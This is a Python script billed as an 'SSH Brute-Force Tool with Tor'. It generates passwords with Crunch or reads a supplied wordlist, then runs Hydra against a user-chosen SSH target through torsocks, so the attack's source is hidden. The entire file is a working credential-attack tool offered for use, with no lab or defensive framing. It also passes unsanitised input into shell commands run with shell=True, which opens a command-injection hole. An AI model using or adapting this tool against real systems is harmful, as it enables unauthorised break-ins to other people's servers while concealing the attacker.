import subprocess
import logging
import os

# Set up logging to file only (remove the console output for logs)
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# Create a file handler to log output to a file
file_handler = logging.FileHandler('output.log', mode='a')
file_handler.setLevel(logging.INFO)

# Define a log formatter
formatter = logging.Formatter('%(asctime)s - %(message)s')
file_handler.setFormatter(formatter)

# Add file handler to the logger
logger.addHandler(file_handler)

# Print the banner to the screen
banner = """
=============================================
|     SSH Brute-Force Tool with Tor         |
|   Powered by Python + Crunch + Hydra     |
|   Uses Crunch to generate passwords      |
|   Routes through Tor using Torsocks      |
=============================================
"""
print(banner)

# Log user inputs
target_ip = input("[?] Enter target IP address: ")
print(f"[+] Target IP: {target_ip}")
logger.info(f"[+] Target IP: {target_ip}")

user_list_file = input("[?] Enter path to username list file: ")
print(f"[+] Username list: {user_list_file}")
logger.info(f"[+] Username list: {user_list_file}")

wordlist_option = input("[?] Do you want to use a custom wordlist for passwords (y/n): ").lower()
logger.info(f"[+] Wordlist option: {wordlist_option}")
print(f"[+] Wordlist option: {wordlist_option}")

# If user wants to use a custom wordlist, ask for the file path
if wordlist_option == 'y':
    wordlist_file = input("[?] Enter path to wordlist file: ")
    print(f"[+] Wordlist file: {wordlist_file}")
    logger.info(f"[+] Wordlist file: {wordlist_file}")
else:
    min_len = input("[?] Enter minimum password length: ")
    max_len = input("[?] Enter maximum password length: ")
    char_set = input("[?] Enter character set for Crunch (e.g., abc123): ")

    print(f"[+] Crunch started with command: crunch {min_len} {max_len} {char_set}")
    logger.info(f"[+] Crunch started with command: crunch {min_len} {max_len} {char_set}")

    # Create a temporary password file to store Crunch output
    password_file = "generated_passwords.txt"

    # Run Crunch command and log output to file
    crunch_command = f"crunch {min_len} {max_len} {char_set} -o {password_file}"
    logger.info(f"[+] Running Crunch with command: {crunch_command}")
    crunch_process = subprocess.Popen(crunch_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = crunch_process.communicate()

    if stdout:
        logger.info(f"[+] Crunch output: {stdout.decode()}")
    if stderr:
        logger.error(f"[!] Crunch errors: {stderr.decode()}")

    wordlist_file = password_file  # Use the generated password file for Hydra

# Run Hydra with output from Crunch or user-provided wordlist
hydra_command = f"torsocks hydra -L {user_list_file} -P {wordlist_file} -t 4 ssh://{target_ip}"
logger.info(f"[+] Starting Hydra attack with command: {hydra_command}")
print(f"[+] Starting Hydra attack with command: {hydra_command}")

hydra_process = subprocess.Popen(hydra_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
hydra_stdout, hydra_stderr = hydra_process.communicate()

if hydra_stdout:
    logger.info(f"[+] Hydra output: {hydra_stdout.decode()}")
if hydra_stderr:
    logger.error(f"[!] Hydra errors: {hydra_stderr.decode()}")

# Clean up the temporary password file after use (if created)
if wordlist_option != 'y' and os.path.exists(password_file):
    os.remove(password_file)

print("[+] Attack completed. Check the log file for results.")
logger.info("[+] Attack completed. Check the log file for results.")
